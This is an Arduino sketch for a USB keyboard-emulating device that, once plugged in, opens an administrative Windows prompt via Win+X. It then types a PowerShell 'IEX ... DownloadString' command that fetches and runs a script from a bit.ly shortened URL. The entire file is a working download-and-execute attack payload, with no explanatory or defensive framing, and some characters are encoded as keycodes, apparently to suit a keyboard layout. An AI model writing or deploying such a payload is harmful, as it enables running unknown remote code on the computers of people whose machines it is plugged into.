#include <HID.h>
#include <Keyboard.h>

// Init function
void setup()
{
  // Start Keyboard and Mouse
  Keyboard.begin();

  // Start Payload
  // press Windows+X
  Keyboard.press(KEY_LEFT_GUI);
  delay(1000);
  Keyboard.press('x');
  Keyboard.releaseAll();
  delay(500);

  // launch Command Prompt (Admin)
  Keyboard.press('i');
  Keyboard.releaseAll();
  delay(500);

  Keyboard.println("IEX ");
  Keyboard.write(42); // (
  Keyboard.println("New");
  Keyboard.write(47); // -
  Keyboard.println("Object Net.WebClient");
  Keyboard.write(40); // )
  Keyboard.println(".DownloadString");
  Keyboard.write(42); // (
  Keyboard.write(64); // "
  Keyboard.println("https");
  Keyboard.write(62); // :
  Keyboard.write(38); // /
  Keyboard.write(38); // /
  Keyboard.println("bit.ly");
  Keyboard.write(38); // /
  Keyboard.println("2El9Fyw");
  Keyboard.write(64); // "
  Keyboard.write(40);
    
  typeKey(KEY_RETURN);  
  delay(100);

  //Keyboard.print("exit");
  typeKey(KEY_RETURN);  
  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(500);
  Keyboard.release(key);
}
